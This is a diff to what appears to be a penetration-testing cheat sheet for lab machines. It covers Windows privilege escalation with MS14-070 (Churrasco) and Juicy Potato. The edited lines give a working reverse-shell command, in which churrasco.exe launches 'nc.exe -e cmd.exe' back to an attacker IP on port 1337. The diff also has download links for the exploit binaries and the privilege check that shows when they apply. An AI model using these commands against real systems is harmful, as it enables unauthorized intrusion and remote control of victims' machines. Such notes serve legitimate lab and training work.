@@ -212,8 +212,8 @@ Password Protected SSH Private Key:
 	- Privelege escalation 
 		- MS14-070 (Windows 2003):
 			- https://github.com/Re4son/Churrasco/raw/master/churrasco.exe
-			- Get nc.exe on the victim machine
-			- C:\tmp\churrasco.exe "C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337"
+			- Get nc.exe and churrasco.exe on the victim machine
+			- C:\temp\churrasco.exe "C:\\temp\\nc.exe -e cmd.exe 10.10.XX.XX 1337"
 		- Juicy Potato
 			- SeImpersonatePrivilege and seAssignPrimaryTokenPrivilege needs to be enabled: whoami /priv
 			- Download the exe: https://github.com/ohpe/juicy-potato/releases/tag/v0.1
